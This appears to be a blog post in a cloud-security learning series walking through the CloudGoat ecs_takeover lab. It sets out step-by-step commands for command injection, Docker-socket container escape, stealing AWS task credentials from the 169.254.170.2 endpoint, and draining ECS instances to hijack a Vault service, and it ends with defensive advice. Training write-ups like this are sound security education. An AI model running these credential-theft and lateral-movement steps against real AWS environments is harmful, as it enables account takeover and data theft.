---
title: '100 Days of Cloud Security - Day 42: Attack — ecs_takeover'
date: '2025-12-21'
author: 'Venkata Pathuri'
excerpt: 'Day 42 of my cloud security journey - Attack — ecs_takeover'
tags: ['cloud-security', 'aws', '100days', 'cybersecurity']
---

# Day 42: Attack — ecs_takeover

## Overview
Welcome to Day 42 of our cloud security journey! Today, we dive into an intriguing attack scenario known as `ecs_takeover`, which builds upon the foundational knowledge you acquired in Day 41 about AWS’s Elastic Container Service (ECS). Here, you'll not only learn how attackers can exploit vulnerabilities in containerized applications but also how to defend against such attacks. Understanding these tactics is crucial for anyone looking to protect cloud environments effectively.

## Learning Objectives
By the end of today's session, you will master the process of deploying the CloudGoat `ecs_takeover` attack scenario. You will learn how to exploit vulnerabilities in ECS services, gain access to sensitive containers, and retrieve secret information. This knowledge will empower you to identify potential security weaknesses in your own cloud environments and implement strategies to mitigate such risks.

## Deep Dive
### Understanding the Scenario
In our `ecs_takeover` scenario, we have a setup consisting of a VPC, EC2 instances, an ECS cluster, and several ECS services. The vulnerability lies in a web application that allows command injection, enabling us to retrieve sensitive information and ultimately take control of the ECS services.

### The Attack Path
1. **Initial Compromise**: We begin by exploiting a command injection vulnerability in a web application hosted on an EC2 instance. Through this, we can access the ECS metadata and retrieve the role's credentials associated with the **ecs-agent**.

   Execute the following command to verify our identity:
   ```bash
   aws sts get-caller-identity --profile cg
   ```

   This returns a JSON object confirming our current credentials:
   ```json
   {
       "UserId": "AROA6QRD2LZQM4WN3OSYR:i-0554cef0c9490eb1d",
       "Account": "997581282912",
       "Arn": "arn:aws:sts::997581282912:assumed-role/cg-ecs-takeover-cgid99006jbrln-ecs-agent/i-0554cef0c9490eb1d"
   }
   ```

2. **Host Enumeration**: Using the command injection vulnerability, we run `awsenum.py` to enumerate ECS details. This helps us identify critical components, such as the cluster name and container instance ARN.

3. **Identifying Vulnerable Targets**: After gathering information, we discover a task named `privd`, which is likely a privileged daemon. The `vulnsite` application also reveals that the Docker socket is mounted, thus confirming our ability to escape the container.

4. **Container Escape**: We can execute commands on the host using the Docker socket mounted in the vulnerable application. This allows us to deploy a new privileged container and access the root file system.

   For example, to list all running Docker containers:
   ```bash
   ; docker ps
   ```

5. **Credential Theft**: By executing a command inside the `privd` container, we retrieve its AWS credentials from the special endpoint `169.254.170.2`. Save these credentials to a new profile called **cg-privd** for later use.

   For instance, run:
   ```bash
   docker exec 83ca8ec0eff2 sh -c 'wget -O- 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI'
   ```

6. **Reconnaissance with Escalated Privileges**: With the new profile, we verify our identity and search for the "Vault" service, which likely contains the flag we seek:
   ```bash
   aws sts get-caller-identity --profile cg-privd
   ```

7. **Service Migration**: To gain access to the Vault service, we set the container instance running Vault to **DRAINING**, forcing ECS to reschedule it to our compromised instance.

8. **Final Steps**: Once the Vault container runs on our host, we simply execute commands within it to access the flag:
   ```bash
   docker exec 870b9d686b6e cat FLAG.TXT
   ```

### Best Practices
- **Monitor Container Permissions**: Always limit the permissions of containers and avoid mounting sensitive paths like the Docker socket unless absolutely necessary.
- **Implement Network Segmentation**: Isolate critical services and monitor traffic to detect and prevent lateral movement.
- **Regularly Scan for Vulnerabilities**: Use automated tools to regularly scan for vulnerabilities in your ECS services and underlying infrastructure.

## Hands-On Practice
To replicate this `ecs_takeover` scenario, follow these steps:

1. **Set Up Your Environment**: Deploy the CloudGoat `ecs_takeover` scenario in your AWS account.

2. **Execute Initial Commands**: Utilize the command injection vulnerability to retrieve the ECS credentials and enumerate the environment.
   ```bash
   aws sts get-caller-identity --profile cg
   ./awsenum.py --profile cg
   ```

3. **Explore ECS Tasks**: Identify the `privd` task and confirm the Docker socket is mounted.
   ```bash
   ; docker ps
   ```

4. **Retrieve Credentials**: Use the commands to access the `privd` container and fetch the AWS credentials:
   ```bash
   docker exec 83ca8ec0eff2 sh -c 'wget -O- 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI'
   ```

5. **Lateral Movement**: Utilize the credentials to perform reconnaissance and drain other services to access the flag:
   ```bash
   aws --profile cg-privd ecs update-container-instances-state --cluster ecs-takeover-cgid99006jbrln-cluster --container-instances baa7166edfaa482dab4f1f359f76cbba --status DRAINING
   ```

### Common Pitfalls
- **Misconfigured IAM Roles**: Ensure IAM roles attached to ECS tasks have the minimum necessary permissions.
- **Overlooking Security Groups**: Regularly review and tighten security group rules to restrict access to your services.

## Key Takeaways
Today, you explored the `ecs_takeover` attack scenario, learning how vulnerabilities in containerized applications can lead to significant security breaches. You gained hands-on experience in exploiting these vulnerabilities and understood the importance of implementing robust security measures to protect your cloud environments.

## Real-World Applications
Understanding how to identify and exploit these vulnerabilities enables security professionals to better defend against potential attacks in production environments. By applying the knowledge gained today, organizations can enhance their cloud security posture, protecting sensitive data and maintaining compliance with industry standards.

---
**Journey Progress:** 42/100 Days Complete 🚀